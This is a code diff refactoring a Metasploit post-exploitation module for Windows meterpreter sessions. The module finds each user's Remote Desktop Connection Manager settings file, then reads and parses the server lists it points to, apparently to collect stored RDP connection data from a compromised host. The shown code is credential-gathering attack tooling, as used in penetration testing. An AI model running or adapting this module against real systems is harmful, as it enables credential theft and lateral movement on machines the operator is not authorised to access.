@@ -31,14 +31,13 @@ class Metasploit3 < Msf::Post
           be captured and documented.
         },
         'License'       => MSF_LICENSE,
-        'Author'        => [ 'Tom Sellers <tom <at> fadedcode.net>'],
+        'Author'        => [ 'Tom Sellers <tom[at]fadedcode.net>'],
         'Platform'      => [ 'win' ],
         'SessionTypes'  => [ 'meterpreter' ]
       ))
   end
 
   def run
-
     if is_system?
       uid = session.sys.config.getuid
       print_warning("This module is running under #{uid}.")
@@ -47,38 +46,27 @@ class Metasploit3 < Msf::Post
     end
 
     settings_file = 'Microsoft Corporation\\Remote Desktop Connection Manager\RDCMan.settings'
-
     profiles = grab_user_profiles
+
     profiles.each do |user|
       next if user['LocalAppData'].nil?
       settings_path = "#{user['LocalAppData']}\\#{settings_file}"
-      if session.fs.file.exists?(settings_path)
-        print_status
-        print_status("Found settings for #{user['UserName']}.")
-      else
-        # User doesn't have a RDC Manager settings file
-        next
-      end
+      next unless file?(settings_path)
+      print_status("Found settings for #{user['UserName']}.")
 
-      connection_data = ''
+      settings = read_file(settings_path)
+      connection_files = settings.scan(/string&gt;(.*?)&lt;\/string/)
 
-      present = session.fs.file.stat(settings_path) rescue nil
-      if present
-        settings = read_file(settings_path)
-        connection_files = settings.scan(/string&gt;(.*?)&lt;\/string/)
-        connection_files.each do |con_f|
-          next unless session.fs.file.exists?(con_f[0])
-          print_status("\tOpening RDC Manager server list: #{con_f[0]}")
-          connection_data = read_file(con_f[0])
-          if connection_data
-            parse_connections(connection_data)
-          else
-            print_error("\tUnable to open RDC Manager server list: #{con_f[0]}")
-            next
-          end
+      connection_files.each do |con_f|
+        next unless session.fs.file.exists?(con_f[0])
+        print_status("\tOpening RDC Manager server list: #{con_f[0]}")
+        connection_data = read_file(con_f[0])
+        if connection_data
+          parse_connections(connection_data)
+        else
+          print_error("\tUnable to open RDC Manager server list: #{con_f[0]}")
+          next
         end
-      else
-        print_error("Unable to access settings for #{user['UserName']}.")
       end
     end
   end
